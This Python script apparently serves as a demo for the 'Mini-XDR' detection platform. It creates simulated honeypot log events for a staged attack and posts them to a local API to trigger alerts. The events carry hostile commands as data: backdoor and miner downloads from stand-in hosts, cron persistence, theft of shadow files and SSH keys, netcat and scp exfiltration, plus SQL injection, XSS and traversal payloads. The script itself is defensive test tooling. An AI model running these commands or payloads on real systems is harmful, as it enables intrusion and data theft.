#!/usr/bin/env python3
"""
🎬 MINI-XDR COMPREHENSIVE DEMO ATTACK SCRIPT
=============================================

This script generates a realistic multi-stage cyber attack to demonstrate
the full capabilities of Mini-XDR's ML models and AI agents:

ATTACK PHASES:
  Phase 1: Network Reconnaissance (port scanning)
  Phase 2: SSH Brute Force Attack (credential stuffing)
  Phase 3: Successful Compromise (initial access)
  Phase 4: Post-Exploitation (commands, file downloads, persistence)
  Phase 5: Data Exfiltration Attempt

AI AGENTS TRIGGERED:
  ✓ Enhanced Threat Detector (79-feature ML classification)
  ✓ Council of Models (Gemini Judge, Grok Intel, OpenAI Remediation)
  ✓ Forensics Agent (evidence collection, timeline reconstruction)
  ✓ Context Analyzer (multi-dimensional threat assessment)
  ✓ Containment Agent (automated IP blocking)
  ✓ Attribution Agent (threat actor profiling)

Usage:
  python3 run-full-demo-attack.py [--attack-type TYPE] [--fast] [--attacker-ip IP]

Attack Types:
  full        - Complete multi-stage attack (all 5 phases) [default]
  brute-force - SSH brute force attack with credential stuffing
  recon       - Network reconnaissance / port scanning only
  apt         - Advanced Persistent Threat (stealth post-exploitation)
  exfil       - Data exfiltration focused attack
  malware     - Malware download and execution
  web-attack  - Web application attack (SQL injection, XSS)
"""

import argparse
import json
import random
import string
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timedelta
from typing import Any, Dict, List

# Configuration
API_BASE = "http://localhost:8000"
FRONTEND_URL = "http://localhost:3000"

# Attack type configurations
ATTACK_TYPES = {
    "full": {
        "name": "Full Multi-Stage Attack",
        "description": "Complete attack chain: recon → brute force → compromise → post-exploit → exfil",
        "phases": [1, 2, 3, 4, 5],
        "threat_class": "Advanced Persistent Threat",
    },
    "brute-force": {
        "name": "SSH Brute Force Attack",
        "description": "Aggressive credential stuffing attack on SSH service",
        "phases": [2, 3],  # Just brute force and successful login
        "threat_class": "Brute Force Attack",
    },
    "recon": {
        "name": "Network Reconnaissance",
        "description": "Port scanning and service enumeration",
        "phases": [1],
        "threat_class": "Network Reconnaissance",
    },
    "apt": {
        "name": "Advanced Persistent Threat",
        "description": "Stealthy post-exploitation with persistence mechanisms",
        "phases": [3, 4],  # Skip noisy recon/brute force, go straight to compromise
        "threat_class": "Advanced Persistent Threat",
    },
    "exfil": {
        "name": "Data Exfiltration",
        "description": "Focus on data theft and exfiltration techniques",
        "phases": [3, 5],  # Compromise then exfil
        "threat_class": "Data Exfiltration",
    },
    "malware": {
        "name": "Malware Deployment",
        "description": "Malware download, execution, and persistence",
        "phases": [3, 4],  # Compromise then post-exploit (includes malware download)
        "threat_class": "Malware/Botnet",
    },
    "web-attack": {
        "name": "Web Application Attack",
        "description": "SQL injection and web exploit attempts",
        "phases": [6],  # Special web attack phase
        "threat_class": "Web Application Attack",
    },
}


# Color codes for terminal output
class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    END = "\033[0m"


def print_banner():
    """Print the demo banner"""
    print(
        f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  {Colors.BOLD}🎬 MINI-XDR COMPREHENSIVE ATTACK DEMONSTRATION{Colors.END}{Colors.CYAN}                           ║
║                                                                              ║
║  This demo showcases the full AI-powered detection and response pipeline:   ║
║                                                                              ║
║    • Enhanced ML Threat Detector (7 threat classes)                         ║
║    • Council of Models (Gemini + Grok + OpenAI)                             ║
║    • Forensics Agent (evidence collection)                                   ║
║    • Automated Containment (real IP blocking)                                ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    )


def print_phase(phase_num: int, title: str, description: str):
    """Print a phase header"""
    print(
        f"""
{Colors.YELLOW}┌──────────────────────────────────────────────────────────────────────────────┐
│  {Colors.BOLD}PHASE {phase_num}: {title.upper()}{Colors.END}{Colors.YELLOW}
│  {Colors.DIM}{description}{Colors.END}{Colors.YELLOW}
└──────────────────────────────────────────────────────────────────────────────┘{Colors.END}
"""
    )


def print_event(icon: str, message: str, detail: str = None):
    """Print an event with optional detail"""
    print(f"  {icon} {message}")
    if detail:
        print(f"     {Colors.DIM}{detail}{Colors.END}")


def generate_attacker_ip() -> str:
    """Generate a realistic-looking external IP"""
    # Use known "bad" IP ranges for demo realism (not actually bad, just for show)
    prefixes = [
        (45, 33),  # DigitalOcean-ish
        (185, 220),  # Eastern Europe-ish
        (103, 75),  # Asian hosting
        (89, 248),  # Russian hosting-ish
        (193, 37),  # European VPS
    ]
    prefix = random.choice(prefixes)
    return f"{prefix[0]}.{prefix[1]}.{random.randint(1, 254)}.{random.randint(1, 254)}"


def generate_session_id() -> str:
    """Generate a realistic session ID"""
    return "".join(random.choices(string.hexdigits.lower(), k=12))


def get_timestamp() -> str:
    """Get current UTC timestamp in ISO format"""
    return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def send_event(event: Dict[str, Any], show_response: bool = False) -> bool:
    """Send an event to the ingestion API"""
    try:
        data = json.dumps(event).encode("utf-8")
        req = urllib.request.Request(
            f"{API_BASE}/ingest/cowrie",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=30) as response:
            return response.status == 200
    except urllib.error.HTTPError as e:
        if show_response:
            print(f"     {Colors.RED}API Error: {e.code} {e.reason}{Colors.END}")
        return False
    except Exception as e:
        print(f"     {Colors.RED}Connection Error: {e}{Colors.END}")
        return False


def send_events_batch(events: List[Dict[str, Any]]) -> bool:
    """Send multiple events in a batch"""
    try:
        data = json.dumps(events).encode("utf-8")
        req = urllib.request.Request(
            f"{API_BASE}/ingest/cowrie",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=60) as response:
            return response.status == 200
    except Exception as e:
        print(f"     {Colors.RED}Batch Error: {e}{Colors.END}")
        return False


# =============================================================================
# ATTACK PHASE GENERATORS
# =============================================================================


def phase1_reconnaissance(
    attacker_ip: str, session_id: str, fast_mode: bool
) -> List[Dict]:
    """
    Phase 1: Network Reconnaissance

    Simulates port scanning behavior - probing multiple ports to find services.
    This triggers Network Reconnaissance detection (threat class 2).
    """
    print_phase(
        1,
        "Network Reconnaissance",
        "Simulating port scan to discover vulnerable services",
    )

    events = []
    target_ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]

    for i, port in enumerate(target_ports):
        event = {
            "eventid": "cowrie.session.connect",
            "src_ip": attacker_ip,
            "src_port": 40000 + i,
            "dst_ip": "203.0.113.42",
            "dst_port": port,
            "timestamp": get_timestamp(),
            "session": f"{session_id}_scan_{i}",
            "message": f"New connection: {attacker_ip}:{40000+i} -> port {port}",
            "sensor": "cowrie",
            "protocol": "tcp",
        }
        events.append(event)

        print_event("🔍", f"Probing port {port}", f"Source port: {40000+i}")

        if not fast_mode:
            time.sleep(0.2)

    # Add connection closed events (rapid disconnects indicate scanning)
    for i, port in enumerate(target_ports):
        close_event = {
            "eventid": "cowrie.session.closed",
            "src_ip": attacker_ip,
            "dst_port": port,
            "timestamp": get_timestamp(),
            "session": f"{session_id}_scan_{i}",
            "message": f"Connection closed after 0.1s (port scan behavior)",
            "sensor": "cowrie",
            "duration": 0.1,
        }
        events.append(close_event)

    print(
        f"\n  {Colors.GREEN}✓ Reconnaissance phase: {len(target_ports)} ports scanned{Colors.END}"
    )
    return events


def phase2_brute_force(
    attacker_ip: str, session_id: str, fast_mode: bool
) -> List[Dict]:
    """
    Phase 2: SSH Brute Force Attack

    Simulates credential stuffing attack with diverse usernames/passwords.
    This triggers Brute Force Attack detection (threat class 3).
    """
    print_phase(
        2,
        "SSH Brute Force Attack",
        "Attempting credential stuffing with common username/password combos",
    )

    events = []

    # Realistic credential combinations (common in real attacks)
    credentials = [
        ("root", "root"),
        ("root", "admin"),
        ("root", "123456"),
        ("root", "password"),
        ("root", "toor"),
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password123"),
        ("admin", "admin123"),
        ("ubuntu", "ubuntu"),
        ("user", "user"),
        ("test", "test"),
        ("guest", "guest"),
        ("pi", "raspberry"),
        ("oracle", "oracle"),
        ("postgres", "postgres"),
        ("mysql", "mysql"),
        ("ftp", "ftp"),
        ("www-data", "www-data"),
        ("backup", "backup"),
        ("root", "P@ssw0rd"),
        ("root", "qwerty"),
        ("root", "letmein"),
        ("root", "welcome"),
        ("root", "monkey"),
        ("administrator", "administrator"),
        ("admin", "nimda"),
        ("root", "changeme"),
        ("root", "default"),
        ("support", "support"),
    ]

    for i, (username, password) in enumerate(credentials):
        event = {
            "eventid": "cowrie.login.failed",
            "src_ip": attacker_ip,
            "src_port": 45000 + i,
            "dst_ip": "203.0.113.42",
            "dst_port": 22,
            "username": username,
            "password": password,
            "timestamp": get_timestamp(),
            "session": f"{session_id}_bf_{i}",
            "message": f"login attempt [{username}/{password}] failed",
            "sensor": "cowrie",
            "protocol": "ssh",
        }
        events.append(event)

        # Visual feedback - show attempts with increasing urgency
        if i < 10:
            print_event(
                "🔐", f"Attempt {i+1}: {username}/{password}", "Authentication failed"
            )
        elif i == 10:
            print_event(
                "⚡",
                f"... {len(credentials) - 10} more attempts ...",
                "Rapid credential stuffing",
            )

        if not fast_mode:
            time.sleep(0.15)

    print(
        f"\n  {Colors.GREEN}✓ Brute force phase: {len(credentials)} login attempts{Colors.END}"
    )
    print(
        f"  {Colors.DIM}Unique usernames: {len(set(c[0] for c in credentials))}{Colors.END}"
    )
    print(
        f"  {Colors.DIM}Unique passwords: {len(set(c[1] for c in credentials))}{Colors.END}"
    )

    return events


def phase3_successful_login(
    attacker_ip: str, session_id: str, fast_mode: bool
) -> List[Dict]:
    """
    Phase 3: Successful Compromise

    Simulates successful authentication - attacker gains initial access.
    This elevates severity and triggers forensic evidence collection.
    """
    print_phase(
        3,
        "Successful Compromise",
        "Attacker found valid credentials - initial access achieved!",
    )

    events = []

    # Successful login
    success_event = {
        "eventid": "cowrie.login.success",
        "src_ip": attacker_ip,
        "src_port": 46000,
        "dst_ip": "203.0.113.42",
        "dst_port": 22,
        "username": "root",
        "password": "toor",  # Classic weak password
        "timestamp": get_timestamp(),
        "session": f"{session_id}_shell",
        "message": "login success [root/toor]",
        "sensor": "cowrie",
        "protocol": "ssh",
    }
    events.append(success_event)

    print_event(
        "🚨",
        f"{Colors.RED}SUCCESSFUL LOGIN: root/toor{Colors.END}",
        "Attacker has gained shell access!",
    )

    if not fast_mode:
        time.sleep(1)  # Dramatic pause

    print(f"\n  {Colors.RED}⚠️  CRITICAL: Initial Access Achieved{Colors.END}")

    return events


def phase4_post_exploitation(
    attacker_ip: str, session_id: str, fast_mode: bool
) -> List[Dict]:
    """
    Phase 4: Post-Exploitation

    Simulates attacker activity after gaining access:
    - System enumeration
    - Downloading malicious tools
    - Establishing persistence
    - Lateral movement preparation

    This triggers Malware/Botnet detection and forensic analysis.
    """
    print_phase(
        4,
        "Post-Exploitation Activity",
        "Attacker executing commands, downloading tools, establishing persistence",
    )

    events = []
    shell_session = f"{session_id}_shell"

    # Attacker commands (realistic post-exploitation)
    commands = [
        # System enumeration
        ("uname -a", "Gathering system information"),
        ("cat /etc/passwd", "Enumerating users"),
        ("cat /etc/shadow", "Attempting to access password hashes"),
        ("whoami && id", "Checking current privileges"),
        ("ps aux", "Listing running processes"),
        ("netstat -tuln", "Checking network connections"),
        ("df -h", "Checking disk space"),
        ("cat /etc/crontab", "Checking scheduled tasks"),
        # Downloading malicious tools
        (
            "wget http://malicious.site/backdoor.sh -O /tmp/.bd",
            "Downloading backdoor script",
        ),
        ("curl -o /tmp/.miner http://cryptopool.xyz/xmrig", "Downloading cryptominer"),
        ("chmod +x /tmp/.bd /tmp/.miner", "Making scripts executable"),
        # Persistence mechanisms
        (
            "echo '* * * * * /tmp/.miner' >> /var/spool/cron/root",
            "Adding cron persistence",
        ),
        ("echo '/tmp/.bd &' >> /etc/rc.local", "Adding startup persistence"),
        # Lateral movement preparation
        ("cat ~/.ssh/known_hosts", "Harvesting SSH targets"),
        ("cat ~/.ssh/id_rsa", "Stealing SSH private keys"),
        ("find / -name '*.pem' 2>/dev/null", "Searching for certificates"),
    ]

    for i, (cmd, description) in enumerate(commands):
        event = {
            "eventid": "cowrie.command.input",
            "src_ip": attacker_ip,
            "dst_port": 22,
            "timestamp": get_timestamp(),
            "session": shell_session,
            "input": cmd,
            "message": f"CMD: {cmd}",
            "sensor": "cowrie",
        }
        events.append(event)

        # Categorize for visual display
        if "wget" in cmd or "curl" in cmd:
            icon = "📥"
            color = Colors.RED
        elif "chmod" in cmd or "cron" in cmd or "rc.local" in cmd:
            icon = "🔧"
            color = Colors.YELLOW
        elif ".ssh" in cmd or "pem" in cmd:
            icon = "🔑"
            color = Colors.RED
        else:
            icon = "💻"
            color = Colors.CYAN

        print_event(icon, f"{color}{cmd}{Colors.END}", description)

        if not fast_mode:
            time.sleep(0.3)

    # File download events (malware indicators)
    downloads = [
        ("backdoor.sh", "http://malicious.site/backdoor.sh", "8a2e1b4c5d6f7890"),
        ("xmrig", "http://cryptopool.xyz/xmrig", "9b3f2c5d6e7f8901"),
    ]

    for filename, url, sha256 in downloads:
        dl_event = {
            "eventid": "cowrie.session.file_download",
            "src_ip": attacker_ip,
            "dst_port": 22,
            "timestamp": get_timestamp(),
            "session": shell_session,
            "url": url,
            "outfile": f"/tmp/.{filename}",
            "shasum": sha256,
            "message": f"File downloaded: {url}",
            "sensor": "cowrie",
        }
        events.append(dl_event)

    print(
        f"\n  {Colors.GREEN}✓ Post-exploitation: {len(commands)} commands executed{Colors.END}"
    )
    print(f"  {Colors.RED}⚠️  Malware downloaded: {len(downloads)} files{Colors.END}")

    return events


def phase5_exfiltration(
    attacker_ip: str, session_id: str, fast_mode: bool
) -> List[Dict]:
    """
    Phase 5: Data Exfiltration Attempt

    Simulates attacker attempting to steal sensitive data.
    This triggers DLP Agent alerts and increases incident severity.
    """
    print_phase(
        5,
        "Data Exfiltration Attempt",
        "Attacker attempting to steal sensitive data and credentials",
    )

    events = []
    shell_session = f"{session_id}_shell"

    # Data exfiltration commands
    exfil_commands = [
        ("tar -czf /tmp/data.tar.gz /etc /home", "Compressing sensitive directories"),
        ("base64 /etc/shadow > /tmp/shadow.b64", "Encoding password hashes"),
        ("cat /tmp/data.tar.gz | nc 185.220.101.1 4444", "Exfiltrating via netcat"),
        ("scp /tmp/shadow.b64 attacker@external:~/loot/", "SCP exfiltration attempt"),
    ]

    for cmd, description in exfil_commands:
        event = {
            "eventid": "cowrie.command.input",
            "src_ip": attacker_ip,
            "dst_port": 22,
            "timestamp": get_timestamp(),
            "session": shell_session,
            "input": cmd,
            "message": f"CMD: {cmd}",
            "sensor": "cowrie",
        }
        events.append(event)

        print_event("📤", f"{Colors.RED}{cmd}{Colors.END}", description)

        if not fast_mode:
            time.sleep(0.3)

    # File upload event (exfiltration)
    upload_event = {
        "eventid": "cowrie.session.file_upload",
        "src_ip": attacker_ip,
        "dst_port": 22,
        "timestamp": get_timestamp(),
        "session": shell_session,
        "filename": "data.tar.gz",
        "message": "Outbound file transfer detected (possible exfiltration)",
        "sensor": "cowrie",
    }
    events.append(upload_event)

    print(f"\n  {Colors.RED}⚠️  CRITICAL: Data exfiltration detected{Colors.END}")

    return events


def phase6_web_attack(attacker_ip: str, session_id: str, fast_mode: bool) -> List[Dict]:
    """
    Phase 6: Web Application Attack

    Simulates SQL injection, XSS, and other web exploits.
    This triggers Web Application Attack detection.
    """
    print_phase(
        6,
        "Web Application Attack",
        "SQL injection and web exploit attempts against web services",
    )

    events = []

    # SQL Injection attempts
    sql_payloads = [
        ("' OR '1'='1' --", "Classic SQL injection"),
        ("'; DROP TABLE users; --", "Destructive SQL injection"),
        ("' UNION SELECT username, password FROM users --", "Data extraction SQLi"),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", "Time-based blind SQLi"),
        ("admin'/*", "Comment-based bypass"),
    ]

    for payload, description in sql_payloads:
        event = {
            "eventid": "cowrie.http.request",
            "src_ip": attacker_ip,
            "dst_port": 80,
            "timestamp": get_timestamp(),
            "session": f"{session_id}_web",
            "method": "POST",
            "url": f"/api/login?username={payload}",
            "message": f"SQL Injection attempt: {payload[:40]}...",
            "sensor": "cowrie",
            "request_headers": {"Content-Type": "application/x-www-form-urlencoded"},
        }
        events.append(event)
        print_event("💉", f"{Colors.RED}{payload[:50]}{Colors.END}", description)

        if not fast_mode:
            time.sleep(0.2)

    # XSS attempts
    xss_payloads = [
        ("<script>alert('XSS')</script>", "Reflected XSS"),
        ("<img src=x onerror=alert('XSS')>", "Event handler XSS"),
        ("javascript:alert(document.cookie)", "JavaScript protocol XSS"),
    ]

    for payload, description in xss_payloads:
        event = {
            "eventid": "cowrie.http.request",
            "src_ip": attacker_ip,
            "dst_port": 80,
            "timestamp": get_timestamp(),
            "session": f"{session_id}_web",
            "method": "GET",
            "url": f"/search?q={payload}",
            "message": f"XSS attempt: {payload[:40]}...",
            "sensor": "cowrie",
        }
        events.append(event)
        print_event("🔴", f"{Colors.YELLOW}{payload[:50]}{Colors.END}", description)

        if not fast_mode:
            time.sleep(0.2)

    # Directory traversal
    traversal_attempts = [
        ("../../../etc/passwd", "Unix passwd file"),
        ("....//....//....//etc/shadow", "Shadow file access"),
        ("/etc/passwd%00.jpg", "Null byte injection"),
    ]

    for path, description in traversal_attempts:
        event = {
            "eventid": "cowrie.http.request",
            "src_ip": attacker_ip,
            "dst_port": 80,
            "timestamp": get_timestamp(),
            "session": f"{session_id}_web",
            "method": "GET",
            "url": f"/files/{path}",
            "message": f"Directory traversal: {path}",
            "sensor": "cowrie",
        }
        events.append(event)
        print_event("📁", f"{Colors.RED}{path}{Colors.END}", description)

        if not fast_mode:
            time.sleep(0.2)

    print(
        f"\n  {Colors.GREEN}✓ Web attack phase: {len(events)} exploit attempts{Colors.END}"
    )
    print(f"  {Colors.RED}⚠️  SQL injection: {len(sql_payloads)} attempts{Colors.END}")
    print(
        f"  {Colors.YELLOW}⚠️  XSS attempts: {len(xss_payloads)} payloads{Colors.END}"
    )

    return events


def check_incident_created(attacker_ip: str) -> Dict[str, Any]:
    """Check if an incident was created for the attack"""
    try:
        req = urllib.request.Request(f"{API_BASE}/api/incidents", method="GET")
        with urllib.request.urlopen(req, timeout=10) as response:
            if response.status == 200:
                incidents = json.loads(response.read().decode("utf-8"))
                for incident in incidents:
                    if incident.get("src_ip") == attacker_ip:
                        return incident
        return None
    except Exception as e:
        print(f"  {Colors.RED}Error checking incidents: {e}{Colors.END}")
        return None


def display_incident_results(incident: Dict[str, Any], attacker_ip: str):
    """Display the incident details in a formatted way"""
    print(
        f"""
{Colors.GREEN}╔══════════════════════════════════════════════════════════════════════════╗
║  {Colors.BOLD}✅ INCIDENT DETECTED AND CREATED!{Colors.END}{Colors.GREEN}                                         ║
╚══════════════════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.BOLD}Incident Details:{Colors.END}
  • ID:            {incident.get('id')}
  • Source IP:     {incident.get('src_ip')}
  • Status:        {incident.get('status', 'N/A').upper()}
  • Severity:      {Colors.RED if incident.get('escalation_level') in ['critical', 'high'] else Colors.YELLOW}{incident.get('escalation_level', 'N/A').upper()}{Colors.END}
  • Risk Score:    {incident.get('risk_score', 0):.2f}

{Colors.BOLD}AI Analysis:{Colors.END}
  • Threat Type:   {incident.get('threat_category', incident.get('reason', 'N/A')[:50])}
  • ML Confidence: {incident.get('ml_confidence', incident.get('containment_confidence', 0)) * 100:.1f}%
"""
    )

    # Show triage note if available
    triage = incident.get("triage_note") or {}
    if triage:
        print(f"{Colors.BOLD}Triage Analysis:{Colors.END}")
        if isinstance(triage, dict):
            print(f"  • Summary: {triage.get('summary', 'N/A')[:80]}")
            print(f"  • Recommendation: {triage.get('recommendation', 'N/A')[:60]}")

            # Show agents data if available
            agents = triage.get("agents", {})
            if agents:
                print(f"\n{Colors.BOLD}Agent Activity:{Colors.END}")
                for agent_name, agent_data in agents.items():
                    status = agent_data.get("status", "unknown")
                    status_icon = (
                        "🟢"
                        if status == "active"
                        else "🟡"
                        if status == "collecting"
                        else "⚪"
                    )
                    print(f"  {status_icon} {agent_name.title()}: {status}")

    # Show actions if any
    actions = incident.get("agent_actions", [])
    if actions:
        print(f"\n{Colors.BOLD}Automated Actions ({len(actions)}):{Colors.END}")
        for action in actions[:5]:
            status_icon = "✅" if action.get("status") == "completed" else "⏳"
            print(f"  {status_icon} {action.get('action', 'N/A')}")

    print(
        f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════════{Colors.END}

{Colors.BOLD}🎯 VIEW FULL INCIDENT DETAILS:{Colors.END}
   {FRONTEND_URL}/incidents/incident/{incident.get('id')}

{Colors.BOLD}What to observe in the UI:{Colors.END}
   • AI Threat Analysis card with ML classification
   • Event timeline showing all attack phases
   • Agent action checklist (completed/pending)
   • Council of Models reasoning (if confidence was medium)
   • Containment actions available (Block IP button)

{Colors.CYAN}═══════════════════════════════════════════════════════════════════════════{Colors.END}
"""
    )


def select_attack_type_interactive() -> str:
    """Display interactive menu to select attack type"""
    print(
        f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════╗
║  {Colors.BOLD}SELECT ATTACK TYPE{Colors.END}{Colors.CYAN}                                                        ║
╚══════════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    )

    attack_list = list(ATTACK_TYPES.items())

    for i, (attack_id, config) in enumerate(attack_list, 1):
        # Color code by threat severity
        if config["threat_class"] in [
            "Advanced Persistent Threat",
            "Data Exfiltration",
        ]:
            color = Colors.RED
        elif config["threat_class"] in [
            "Brute Force Attack",
            "Malware/Botnet",
            "Web Application Attack",
        ]:
            color = Colors.YELLOW
        else:
            color = Colors.CYAN

        print(f"  {Colors.BOLD}[{i}]{Colors.END} {color}{config['name']}{Colors.END}")
        print(f"      {Colors.DIM}{config['description']}{Colors.END}")
        print(f"      {Colors.DIM}→ Triggers: {config['threat_class']}{Colors.END}")
        print()

    print(f"  {Colors.BOLD}[0]{Colors.END} {Colors.DIM}Exit{Colors.END}")
    print()

    while True:
        try:
            choice = input(
                f"{Colors.BOLD}Enter choice [1-{len(attack_list)}]: {Colors.END}"
            ).strip()

            if choice == "0" or choice.lower() == "exit" or choice.lower() == "q":
                print(f"\n{Colors.DIM}Exiting...{Colors.END}\n")
                sys.exit(0)

            choice_num = int(choice)
            if 1 <= choice_num <= len(attack_list):
                selected = attack_list[choice_num - 1][0]
                print(
                    f"\n{Colors.GREEN}✓ Selected: {ATTACK_TYPES[selected]['name']}{Colors.END}\n"
                )
                return selected
            else:
                print(
                    f"{Colors.RED}Invalid choice. Please enter 1-{len(attack_list)}{Colors.END}"
                )
        except ValueError:
            # Allow typing the attack type name directly
            if choice.lower() in ATTACK_TYPES:
                print(
                    f"\n{Colors.GREEN}✓ Selected: {ATTACK_TYPES[choice.lower()]['name']}{Colors.END}\n"
                )
                return choice.lower()
            print(
                f"{Colors.RED}Invalid input. Enter a number or attack type name.{Colors.END}"
            )


def main():
    parser = argparse.ArgumentParser(
        description="Mini-XDR Demo Attack Script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Types:
  full        - Complete multi-stage attack (all 5 phases) [default]
  brute-force - SSH brute force attack with credential stuffing
  recon       - Network reconnaissance / port scanning only
  apt         - Advanced Persistent Threat (stealth post-exploitation)
  exfil       - Data exfiltration focused attack
  malware     - Malware download and execution
  web-attack  - Web application attack (SQL injection, XSS)

Examples:
  python3 run-full-demo-attack.py                    # Interactive menu
  python3 run-full-demo-attack.py -t brute-force    # Direct selection
  python3 run-full-demo-attack.py -t apt --fast     # Fast mode
        """,
    )
    parser.add_argument(
        "--attack-type",
        "-t",
        type=str,
        default=None,
        choices=list(ATTACK_TYPES.keys()),
        help="Type of attack to simulate (interactive menu if not specified)",
    )
    parser.add_argument("--fast", "-f", action="store_true", help="Run without delays")
    parser.add_argument("--attacker-ip", "-i", type=str, help="Custom attacker IP")
    parser.add_argument(
        "--list-types", "-l", action="store_true", help="List all attack types"
    )
    parser.add_argument(
        "--no-menu", action="store_true", help="Skip menu, use 'full' attack"
    )
    args = parser.parse_args()

    # List attack types if requested
    if args.list_types:
        print(f"\n{Colors.BOLD}Available Attack Types:{Colors.END}\n")
        for attack_id, config in ATTACK_TYPES.items():
            print(f"  {Colors.CYAN}{attack_id:12}{Colors.END} - {config['name']}")
            print(f"               {Colors.DIM}{config['description']}{Colors.END}")
            print(
                f"               Phases: {config['phases']} → {config['threat_class']}"
            )
            print()
        return

    # Interactive selection if no attack type specified
    if args.attack_type is None and not args.no_menu:
        attack_type = select_attack_type_interactive()
    else:
        attack_type = args.attack_type or "full"

    print_banner()

    # Get attack configuration
    attack_config = ATTACK_TYPES[attack_type]

    # Generate attack parameters
    attacker_ip = args.attacker_ip or generate_attacker_ip()
    session_id = generate_session_id()
    fast_mode = args.fast

    print(f"{Colors.BOLD}Attack Configuration:{Colors.END}")
    print(f"  • Attack Type:  {Colors.CYAN}{attack_config['name']}{Colors.END}")
    print(f"  • Description:  {Colors.DIM}{attack_config['description']}{Colors.END}")
    print(
        f"  • Threat Class: {Colors.YELLOW}{attack_config['threat_class']}{Colors.END}"
    )
    print(f"  • Attacker IP:  {Colors.RED}{attacker_ip}{Colors.END}")
    print(f"  • Session ID:   {session_id}")
    print(
        f"  • Mode:         {'Fast' if fast_mode else 'Normal (with realistic delays)'}"
    )
    print()

    if not fast_mode:
        print(f"{Colors.DIM}Starting attack simulation in 3 seconds...{Colors.END}")
        time.sleep(3)

    all_events = []

    # Map phase numbers to generator functions
    phase_generators = {
        1: phase1_reconnaissance,
        2: phase2_brute_force,
        3: phase3_successful_login,
        4: phase4_post_exploitation,
        5: phase5_exfiltration,
        6: phase6_web_attack,
    }

    # Execute only the phases for the selected attack type
    for phase_num in attack_config["phases"]:
        generator = phase_generators.get(phase_num)
        if generator:
            events = generator(attacker_ip, session_id, fast_mode)
            all_events.extend(events)

        if not fast_mode:
            time.sleep(1)

    # Send all events
    print(
        f"""
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════════{Colors.END}
{Colors.BOLD}📤 SENDING {len(all_events)} EVENTS TO DETECTION ENGINE{Colors.END}
{Colors.CYAN}═══════════════════════════════════════════════════════════════════════════{Colors.END}
"""
    )

    # Send in batches for better processing
    batch_size = 20
    for i in range(0, len(all_events), batch_size):
        batch = all_events[i : i + batch_size]
        success = send_events_batch(batch)
        status = "✅" if success else "❌"
        print(
            f"  {status} Sent batch {i//batch_size + 1}/{(len(all_events) + batch_size - 1)//batch_size} ({len(batch)} events)"
        )
        if not fast_mode:
            time.sleep(0.5)

    print(f"\n{Colors.BOLD}Waiting for ML detection and AI analysis...{Colors.END}")

    # Poll for incident creation
    max_wait = 30  # seconds
    poll_interval = 2
    incident = None

    for i in range(max_wait // poll_interval):
        if not fast_mode:
            progress = "." * (i + 1)
            print(f"\r  Analyzing{progress}", end="", flush=True)

        incident = check_incident_created(attacker_ip)
        if incident:
            print()
            break
        time.sleep(poll_interval)

    if incident:
        display_incident_results(incident, attacker_ip)
    else:
        print(
            f"""
{Colors.YELLOW}═══════════════════════════════════════════════════════════════════════════{Colors.END}
{Colors.BOLD}⏳ INCIDENT PENDING{Colors.END}

Events have been injected. The detection engine may still be processing.

{Colors.BOLD}To check manually:{Colors.END}
  1. Open {FRONTEND_URL}
  2. Navigate to Incidents page
  3. Look for IP: {attacker_ip}

{Colors.BOLD}Or check the database:{Colors.END}
  sqlite3 backend/xdr.db "SELECT id, src_ip, reason FROM incidents ORDER BY id DESC LIMIT 1"

{Colors.YELLOW}═══════════════════════════════════════════════════════════════════════════{Colors.END}
"""
        )

    print(f"\n{Colors.GREEN}Demo attack simulation complete!{Colors.END}\n")


if __name__ == "__main__":
    main()
